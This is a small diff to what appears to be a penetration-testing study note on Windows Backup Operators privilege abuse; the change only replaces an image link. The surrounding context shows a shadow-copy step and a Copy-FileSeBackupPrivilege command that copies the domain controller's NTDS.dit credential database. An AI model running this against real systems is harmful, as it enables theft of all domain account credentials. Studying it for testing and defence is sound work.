@@ -15,7 +15,8 @@ type .\Contract.txt
 ```
 NTDS.dit
 Creating a shadow copy of C drive and exposing it as E
-![[Pasted image 20260417124241.png|337]]
+
+![Backup-Operators](../Images/Backup-Operators.png)
 ```shell
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
